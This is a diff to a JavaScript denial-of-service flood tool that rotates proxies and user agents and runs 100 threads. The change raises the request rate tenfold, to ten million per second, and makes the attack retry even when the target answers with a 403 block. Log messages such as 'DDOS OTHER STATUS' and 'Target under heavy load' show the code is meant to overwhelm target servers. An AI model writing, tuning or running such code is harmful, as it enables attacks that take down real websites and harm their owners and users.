@@ -66,7 +66,7 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 1000000;
+const requestsPerSecond = 10000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
@@ -119,9 +119,10 @@ const performAttack = (url, agent, headers, continueAttack, onComplete, chat) =>
             chat.log("Target under heavy load (503).");
         } else if (err.response?.status === 502) {
             chat.log("Bad Gateway (502).");
-        } else if (err.response?.status === 403) return;
-        chat.log("DDOS OTHER STATUS" + err.message);
+        }
         setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete, chat), 0);
+        if (err.response?.status === 403) return;
+        chat.log("DDOS OTHER STATUS" + err.message);
     });
 };
 
